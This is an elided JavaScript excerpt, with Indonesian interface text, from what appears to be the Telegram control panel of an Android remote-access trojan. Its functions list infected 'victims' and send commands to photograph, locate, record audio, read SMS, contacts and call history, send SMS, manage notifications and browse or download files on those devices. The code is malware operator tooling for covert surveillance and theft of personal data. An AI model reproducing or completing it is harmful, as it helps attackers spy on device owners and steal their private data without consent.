...
exports.listOnlineVictims = async (msg) => {
    ...
    main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
        ...
        try {
            ...
            let message = `📱 <b>Device Online (${victims.length})</b>\n\n`;
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    victims.forEach((victim, index) => {
                        ...
                        message += `${index + 1}. <b>${deviceName}</b>\n`;
                        message += `   ID: <code>${victim.id}</code>\n`;
        ...
        try {
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    let message = "📸 <b>Pilih device untuk ambil foto:</b>\n\n";
                    victims.forEach((victim, index) => {
                        const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
        ...
        try {
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    let message = "📍 <b>Pilih device untuk dapatkan lokasi:</b>\n\n";
                    victims.forEach((victim, index) => {
                        const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                        message += `${index + 1}. ${deviceName}\n`;
                        message += `   ID: <code>${victim.id}</code>\n\n`;
                    ...
                    main.bot.once('message', async (response) => {
                        ...
                        try {
                            ...
                            const deviceName = nameMap[deviceId] || deviceId;
                            const successMessage = `✅ <b>Perintah lokasi berhasil dikirim!</b>
...
exports.smsControl = (msg) => {
    ...
    main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
        ...
        main.bot.sendMessage(chatId, "📨 <b>SMS Manager</b>\n\nPilih aksi:", {
            parse_mode: "HTML",
            ...keyboard
        });
    });
        ...
        try {
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    let message = "📇 <b>Pilih device untuk lihat kontak:</b>\n\n";
                    victims.forEach((victim, index) => {
                        const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                        message += `${index + 1}. ${deviceName}\n`;
                        message += `   ID: <code>${victim.id}</code>\n\n`;
                    ...
                    main.bot.once('message', async (response) => {
                        ...
                        try {
                            ...
                            const deviceName = nameMap[deviceId] || deviceId;
                            const successMessage = `✅ <b>Perintah kontak berhasil dikirim!</b>
        ...
        try {
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    let message = "📞 <b>Pilih device untuk lihat riwayat panggilan:</b>\n\n";
                    victims.forEach((victim, index) => {
                        const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                        message += `${index + 1}. ${deviceName}\n`;
                        message += `   ID: <code>${victim.id}</code>\n\n`;
                    ...
                    main.bot.once('message', async (response) => {
                        ...
                        try {
                            ...
                            const deviceName = nameMap[deviceId] || deviceId;
                            const successMessage = `✅ <b>Perintah riwayat panggilan berhasil dikirim!</b>
...
exports.filesControl = (msg) => {
    ...
    main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
        ...
        main.bot.sendMessage(chatId, "📁 <b>File Manager</b>\n\nPilih aksi:", {
            parse_mode: "HTML",
            ...keyboard
        });
    });
        ...
        try {
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    let message = "🎤 <b>Pilih device untuk record audio:</b>\n\n";
                    victims.forEach((victim, index) => {
                        const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                        message += `${index + 1}. ${deviceName}\n`;
                        message += `   ID: <code>${victim.id}</code>\n\n`;
                    ...
                    main.bot.once('message', async (response) => {
                        ...
                        try {
                            ...
                            const deviceName = nameMap[deviceId] || deviceId;
                            const successMessage = `✅ <b>Perintah record audio berhasil dikirim!</b>
        ...
        try {
            ...
            main.db.query(
                ...
                (err, deviceNames) => {
                    ...
                    let message = "🔔 <b>Pilih device untuk kelola notifikasi:</b>\n\n";
                    victims.forEach((victim, index) => {
                        const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                        message += `${index + 1}. ${deviceName}\n`;
                        message += `   ID: <code>${victim.id}</code>\n\n`;
                    ...
                    main.bot.once('message', async (response) => {
                        ...
                        const notifMessage = `🔔 <b>Notification Manager</b>
...
Pilih aksi:`;
                        ...
                        main.bot.sendMessage(chatId, notifMessage, {
                            parse_mode: "HTML",
                            ...keyboard
                        });
                    });
            ...
            try {
                ...
                main.db.query(
                    ...
                    (err, deviceNames) => {
                        ...
                        let message = "📥 <b>Pilih device untuk lihat SMS:</b>\n\n";
                        victims.forEach((victim, index) => {
                            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                            message += `${index + 1}. ${deviceName}\n`;
                            message += `   ID: <code>${victim.id}</code>\n\n`;
                        ...
                        main.bot.once('message', async (response) => {
                            ...
                            try {
                                ...
                                const deviceName = nameMap[deviceId] || deviceId;
                                const successMessage = `✅ <b>Perintah lihat SMS berhasil dikirim!</b>
            ...
            try {
                ...
                main.db.query(
                    ...
                    (err, deviceNames) => {
                        ...
                        let message = "📤 <b>Pilih device untuk kirim SMS:</b>\n\n";
                        victims.forEach((victim, index) => {
                            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                            message += `${index + 1}. ${deviceName}\n`;
                            message += `   ID: <code>${victim.id}</code>\n\n`;
                        ...
                        main.bot.once('message', async (response) => {
                            ...
                            try {
                                ...
                                const deviceName = nameMap[deviceId] || deviceId;
                                const successMessage = `✅ <b>SMS berhasil dikirim!</b>

<b>Device:</b> ${deviceName}
<b>ID:</b> <code>${deviceId}</code>
<b>Tujuan:</b> ${phoneNumber}
<b>Pesan:</b> ${smsMessage}`;
            ...
            try {
                ...
                main.db.query(
                    ...
                    (err, deviceNames) => {
                        ...
                        let message = "📂 <b>Pilih device untuk lihat file:</b>\n\n";
                        victims.forEach((victim, index) => {
                            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                            message += `${index + 1}. ${deviceName}\n`;
                            message += `   ID: <code>${victim.id}</code>\n\n`;
                        ...
                        main.bot.once('message', async (response) => {
                            ...
                            try {
                                ...
                                const deviceName = nameMap[deviceId] || deviceId;
                                const successMessage = `✅ <b>Perintah lihat file berhasil dikirim!</b>
            ...
            try {
                ...
                main.db.query(
                    ...
                    (err, deviceNames) => {
                        ...
                        let message = "⬇️ <b>Pilih device untuk download file:</b>\n\n";
                        victims.forEach((victim, index) => {
                            const deviceName = nameMap[victim.id] || `${victim.manufacturer} ${victim.model}`;
                            message += `${index + 1}. ${deviceName}\n`;
                            message += `   ID: <code>${victim.id}</code>\n\n`;
